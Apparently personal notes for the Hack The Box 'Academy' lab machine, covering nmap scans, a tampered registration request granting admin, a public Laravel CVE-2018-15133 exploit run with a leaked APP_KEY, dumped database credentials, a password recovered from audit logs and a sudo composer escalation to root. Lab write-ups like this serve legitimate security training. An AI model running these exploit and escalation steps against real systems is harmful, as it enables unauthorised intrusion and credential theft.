 10.10.10.215 

 add to /etc/hosts 10.10.10.215 as academy.htb


four3y3s@43y3s:~/Downloads/htbwriteups/live/academy$ nmap -Pn  10.10.10.215 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-08 14:59 EST
Stats: 0:00:20 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 9.50% done; ETC: 15:02 (0:03:11 remaining)
Stats: 0:00:21 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 10.00% done; ETC: 15:02 (0:03:09 remaining)
Stats: 0:00:34 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 16.50% done; ETC: 15:02 (0:02:52 remaining)
Stats: 0:00:35 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 17.00% done; ETC: 15:02 (0:02:51 remaining)
Stats: 0:00:36 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 17.50% done; ETC: 15:02 (0:02:50 remaining)
Nmap scan report for 10.10.10.215
Host is up (0.098s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 52.70 seconds
four3y3s@43y3s:~/Downloads/htbwriteups/live/academy$ 
                                                                                                                                                                                
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA)
|   256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA)
|_  256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://academy.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 15:00
Completed NSE at 15:00, 0.00s elapsed
Initiating NSE at 15:00
Completed NSE at 15:00, 0.00s elapsed
Initiating NSE at 15:00
Completed NSE at 15:00, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.88 seconds
four3y3s@43y3s:~/Downloads/htbwriteups/live/academy$ 




we are provided with a webpage


```

3:56PM edited 4:10PM

Whew! Got user and root :smile: a huge thanks to @zweeden for the gentle nudges in the right direction. Didn't give the whole answer, but just helped refocus my efforts when I was spinning my wheels.

The beginning e.g. gaining a foothold I would consider easy difficulty, however I think overall this box should be considered more towards medium difficulty. Not necessarily because it requires any intermediate knowledge on exploits or techniques, but beginners typically struggle the most with enumeration TTP's more than anything. I know I struggled the most at this stage on this box, there is just so much to go through at every sub-stage of enumeration here.

Tips for anyone who is completely stuck:

    Gaining a foothold: this can really be considered two parts. For the web application side, think about how simple it might be to change a certain value so that you can become someone with particular privileges... Once you do that, don't forget the basics about DNS. As @whitewhale mentioned, you need to identify when you find a red herring -- MOVE ON if you are spinning your wheels on a particular finding. If you make it that far, remember to always google application names when you discover something you might not be familiar with. You can see from the machine statistics graph that this is rated very high in well documented exploits.

    User: As everyone else mentioned, enumeration is key. Understand where particular credentials might be stored that you can see as the current particular user (when you gain a foothold). Google how to recursively grep in files, you will need this now and later! Remember that people are creatures of habit, especially with passwords...

    Root: This was really the hardest part for me. If you are not good at enumeration, now is your time to get better. First thing you should always check is who you belong to and what powers and access that gives you. There is SO much to go through, you need to think about how you can use grep or other ways of filtering out the "noise" so you can find particularly interesting entries. Remember that if you pipe into less you can search for regular expressions with /. Use this to build up a repertoire of expressions that you can grep. Also remember that lateral movement is important! "You" might not be able to do something, but you might be able to figure if someone else can... Once you progress, if you are struggling with privesc techniques on a Linux system, OverTheWire's "Leviathan" wargame can seriously give you some good ideas here.


```

```
Rooted!
Nice box, really nice box.
Foothold: Check all your posts and gain admin, then search what can you do to gain RCE from the second part (you will know when you will find it)
User: read every file
Lateral movement: You can read something. Find what and read them all (or grep/bash fu)
Root: This is easy, now gtfo
```


```
POST /register.php HTTP/1.1
Host: academy.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 44
Origin: http://academy.htb
Connection: close
Referer: http://academy.htb/register.php
Cookie: ajs_anonymous_id=%22fa55ba2e-ffde-4ef9-a6b3-d29b63f5444a%22; _fbp=fb.1.1604866167091.1676667884; PHPSESSID=78bc6sdh34mgo6948mgoc0etcn
Upgrade-Insecure-Requests: 1

uid=vcxz&password=vcxz&confirm=vcxz&roleid=0
```


```
/tr>
                <input type="hidden" value="0" name="roleid" />
                ```



register user with roleid set as 1


Academy Launch Planner
Item 	Status
Complete initial set of modules (cry0l1t3 / mrb3n) 	done
Finalize website design 	done
Test all modules 	done
Prepare launch campaign 	done
Separate student and admin roles 	done
Fix issue with dev-staging-01.academy.htb 	pending

use dirbuster to find pages

login to academy.htb/admin.php with credentials 




found dev-staging-01.academy.htb

set /etc/hosts as 10.10.10.215 as dev-staging-01.academy.htb

The stream or file "/var/www/html/htb-academy-dev-01/storage/logs/laravel.log" could not be opened in append mode: failed to open stream: Permission denied

found other sensitive information, stored in sensinfo.txt


found exploit on metasploit

msf6 exploit(unix/http/laravel_token_unserialize_exec)

set rhost 10.10.10.215
set vhost dev-staging-01.academy.htb
set lhost "enter tun0 ip addr"


ended up using something else
four3y3s@43y3s:~/Downloads/tools/exploit_laravel_cve-2018-15133$ python3 pwn_laravel.py http://dev-staging-01.academy.htb/ dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= --interactive
https://github.com/aljavier/exploit_laravel_cve-2018-15133 and APP_KEY


```
ls /home/* -la
/home/21y4d:
total 20
drwxr-xr-x 2 21y4d 21y4d 4096 Aug 10 00:34 .
drwxr-xr-x 8 root  root  4096 Aug 10 00:34 ..
-rw-r--r-- 1 21y4d 21y4d  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 21y4d 21y4d 3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 21y4d 21y4d  807 Feb 25  2020 .profile

/home/ch4p:
total 20
drwxr-xr-x 2 ch4p ch4p 4096 Aug 10 00:34 .
drwxr-xr-x 8 root root 4096 Aug 10 00:34 ..
-rw-r--r-- 1 ch4p ch4p  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 ch4p ch4p 3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 ch4p ch4p  807 Feb 25  2020 .profile

/home/cry0l1t3:
total 32
drwxr-xr-x 4 cry0l1t3 cry0l1t3 4096 Aug 12 21:58 .
drwxr-xr-x 8 root     root     4096 Aug 10 00:34 ..
lrwxrwxrwx 1 root     root        9 Aug 10 23:41 .bash_history -> /dev/null
-rw-r--r-- 1 cry0l1t3 cry0l1t3  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 cry0l1t3 cry0l1t3 3771 Feb 25  2020 .bashrc
drwx------ 2 cry0l1t3 cry0l1t3 4096 Aug 12 21:58 .cache
drwxrwxr-x 3 cry0l1t3 cry0l1t3 4096 Aug 12 02:30 .local
-rw-r--r-- 1 cry0l1t3 cry0l1t3  807 Feb 25  2020 .profile
-r--r----- 1 cry0l1t3 cry0l1t3   33 Dec 24 18:52 user.txt

/home/egre55:
total 24
drwxr-xr-x 3 egre55 egre55 4096 Aug 10 23:41 .
drwxr-xr-x 8 root   root   4096 Aug 10 00:34 ..
lrwxrwxrwx 1 root   root      9 Aug 10 23:41 .bash_history -> /dev/null
-rw-r--r-- 1 egre55 egre55  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 egre55 egre55 3771 Feb 25  2020 .bashrc
drwx------ 2 egre55 egre55 4096 Aug  7 12:13 .cache
-rw-r--r-- 1 egre55 egre55  807 Feb 25  2020 .profile
-rw-r--r-- 1 egre55 egre55    0 Aug  7 12:14 .sudo_as_admin_successful

/home/g0blin:
total 20
drwxr-xr-x 2 g0blin g0blin 4096 Aug 10 00:34 .
drwxr-xr-x 8 root   root   4096 Aug 10 00:34 ..
-rw-r--r-- 1 g0blin g0blin  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 g0blin g0blin 3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 g0blin g0blin  807 Feb 25  2020 .profile

/home/mrb3n:
total 32
drwxr-xr-x 5 mrb3n mrb3n 4096 Aug 12 22:19 .
drwxr-xr-x 8 root  root  4096 Aug 10 00:34 ..
lrwxrwxrwx 1 root  root     9 Aug 10 23:41 .bash_history -> /dev/null
-rw-r--r-- 1 mrb3n mrb3n  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 mrb3n mrb3n 3771 Feb 25  2020 .bashrc
drwxrwxr-x 3 mrb3n mrb3n 4096 Oct 21 10:55 .cache
drwxrwxr-x 3 mrb3n mrb3n 4096 Aug 12 22:19 .config
drwxrwxr-x 3 mrb3n mrb3n 4096 Aug 12 22:19 .local
-rw-r--r-- 1 mrb3n mrb3n  807 Feb 25  2020 .profile


```

upgrade to shell by using `shell`


```www-data@academy:/var/www/html/academy/public$ cat config.php
cat config.php
<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
$link=mysqli_connect('localhost','root','GkEWXn4h34g8qx9fZ1','academy');
?>
www-data@academy:/var/www/html/academy/public$
```

``
www-data@academy:/var/www/html/academy$ cat .env
cat .env
APP_NAME=Laravel
APP_ENV=local
APP_KEY=base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=
APP_DEBUG=false
APP_URL=http://localhost

LOG_CHANNEL=stack

DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=academy
DB_USERNAME=dev
DB_PASSWORD=mySup3rP4s5w0rd!!

BROADCAST_DRIVER=log
CACHE_DRIVER=file
SESSION_DRIVER=file
SESSION_LIFETIME=120
QUEUE_DRIVER=sync

REDIS_HOST=127.0.0.1
REDIS_PASSWORD=null
REDIS_PORT=6379

MAIL_DRIVER=smtp
MAIL_HOST=smtp.mailtrap.io
MAIL_PORT=2525
MAIL_USERNAME=null
MAIL_PASSWORD=null
MAIL_ENCRYPTION=null

PUSHER_APP_ID=
PUSHER_APP_KEY=
PUSHER_APP_SECRET=
PUSHER_APP_CLUSTER=mt1

MIX_PUSHER_APP_KEY="${PUSHER_APP_KEY}"
MIX_PUSHER_APP_CLUSTER="${PUSHER_APP_CLUSTER}"
www-data@academy:/var/www/html/academy$ 
```


try combinations of username and password with su

cry0l1t3 and password works, go to home and get user flag

mySup3rP4s5w0rd!!

$ cat user.txt
cat user.txt
0324585a504dbeedbbccc68a9437ce5c

groups -r as to find adm


cat * | grep 'comm="su"'
type=TTY msg=audit(1597199293.906:84): tty pid=2520 uid=1002 auid=0 ses=1 major=4 minor=1 comm="su" data=6D7262336E5F41634064336D79210A
$ 

https://unix.stackexchange.com/questions/42841/how-to-skip-permission-denied-errors-when-running-find-in-linux
find / -group adm -type f 2>/dev/null command to view the files of all adm groups, as shown in the figure:

find / -group adm -type f 2>/dev/null


mrb3n_Ac@d3my!


$ sudo -l 
[sudo] password for mrb3n: mrb3n_Ac@d3my!

Matching Defaults entries for mrb3n on academy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User mrb3n may run the following commands on academy:
    (ALL) /usr/bin/composer
$ 


gtfobins.github.io

TF=$(mktemp -d)
echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
composer --working-dir=$TF run-script x

$ sudo composer --working-dir=$TF run-script x
[sudo] password for mrb3n: mrb3n_Ac@d3my!

PHP Warning:  PHP Startup: Unable to load dynamic library 'mysqli.so' (tried: /usr/lib/php/20190902/mysqli.so (/usr/lib/php/20190902/mysqli.so: undefined symbol: mysqlnd_global_stats), /usr/lib/php/20190902/mysqli.so.so (/usr/lib/php/20190902/mysqli.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
PHP Warning:  PHP Startup: Unable to load dynamic library 'pdo_mysql.so' (tried: /usr/lib/php/20190902/pdo_mysql.so (/usr/lib/php/20190902/pdo_mysql.so: undefined symbol: mysqlnd_allocator), /usr/lib/php/20190902/pdo_mysql.so.so (/usr/lib/php/20190902/pdo_mysql.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
Do not run Composer as root/super user! See https://getcomposer.org/root for details
> /bin/sh -i 0<&3 1>&3 2>&3
# whoami
root
